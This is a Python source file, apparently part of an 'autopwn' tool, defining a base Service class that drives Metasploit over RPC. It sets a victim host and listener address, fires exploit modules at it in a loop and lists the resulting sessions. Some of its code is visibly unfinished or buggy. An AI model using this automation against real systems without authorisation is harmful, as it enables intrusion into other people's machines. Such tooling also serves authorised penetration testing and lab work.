import socket
from random import randint
from pymetasploit3.msfrpc import MsfRpcClient
from pprint import pprint
from autopwn.util import acid
from ..const import MSFLHOST
from ..util.msf import (
    splitmodule,
    verifyJob
)

import logging


class Service(object):

    def __init__(self, autopwn):

        self._autopwn = autopwn
        self._msfrpcd = self._autopwn._msfrpcd
        self.LHOST = MSFLHOST
        self.log = logging.getLogger(self.__class__.__name__)

    def msfcore(self):
        """ Return Modules in MsfRpcClient """
        return [m for m in dir(self._msfrpcd) if not m.startswith("_")]

    def exploit(self, module):
        self.log.debug("Preparing exploits")
        mType, mPath = splitmodule(module)
        pwn = self._msfrpcd.modules.use(mType, mPath)
        pwn['RPORT'] = self.ports[0]  # Change self.port from a list to single entry
        if "CPORT" in pwn.options:
            pwn["CPORT"] = self.LPORT
        pprint(pwn.options)
        pprint(pwn.targetpayloads())

        self.log.info("Firing payload!".format(pwn.name))
        cid = self._msfrpcd.consoles.console().cid
        result = self._msfrpcd.consoles.console(cid).run_module_with_output(pwn)
        #result = self._msfrpcd.consoles.console(cid).run_cmd_with_output(pwn, payload=self.payload)
        #result = pwn.execute(payload=self.payload)
        self.log.debug("Result: {}".format(result))
        # Verify result
        if not verifyJob(result):
            self.log.info("Exploit failed...")
            return False

        # Wait on exploit to finish


    def exploitall(self, host):
        self.log.debug(f"Performing {self.name} acid test")
        acid.check_port(host, self.ports)

        self.log.debug("Sending all exploits for {}".format(self.name))
        self.victim = host

        for i in self.exploits:
            result = self.exploit(i)
            self.log.debug("Result: {}".format(result))
        self._msfrpcd.consoles.sessionkill()

    def acid_test(self, host):
        raise NotImplementedError("Can't run acid_test on base class")

    def login(self):
        return

    def status(self, ip):
        """ Some sort of base for checking service status """
        if "TCP" in self.protocols:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            for p in self.ports:
                try:
                    s.connect((ip), p)
                    return True
                except socket.error:
                    raise Exception(
                        "{ip}: {name} is down on port {port}".format(
                            ip=ip, name=self.name, port=p
                        )
                    )

    def sessions(self):
        """ List sessions """
        return self._msfrpcd.sessions.list

    def attach(self, sessId):
        """ Attach to a session"""
        for i in self.sessions():
            self.log.debug(i)
            self.log.info("Found session!")

    def detach(self):
        """ Kill a session """
        return

    """ Helpers """

    def search(self, keyword=None):
        if keyword:
            if not isinstance(keyword, str):
                return TypeError("Search keyword must be a string.")
            return [s for s in self._msfrpcd.modules.exploits if keyword.lower() in s]
        return self._msfrpcd.modules.exploits

    def randPort(self):
        return randint(40000, 55000)

    """ Properties """

    @property
    def victim(self):
        return self._victim

    @victim.setter
    def victim(self, host):
        if not isinstance(host, str):
            return TypeError("Host must be an IPv4 string.")
        self._victim = host
        self._msfrpcd.core.setg("RHOSTS", host)
        self._msfrpcd.core.setg("RHOST", host)

    @property
    def LHOST(self):
        return self._LHOST

    @LHOST.setter
    def LHOST(self, host):
        if not isinstance(host, str):
            return TypeError("Must provide an IP address string")
        self._LHOST = host
        self._msfrpcd.core.setg("LHOST", host)

    @property
    def auxiliary(self):
        return self._msfrpcd.modules.auxiliary

    @property
    def encoders(self):
        return self._msfrpcd.modules.encoders

    @property
    def nops(self):
        return self._msfrpcd.modules.nops

    @property
    def payloads(self):
        return self._msfrpcd.modules.payloads

    @property
    def post(self):
        return self._msfrpcd.modules.post

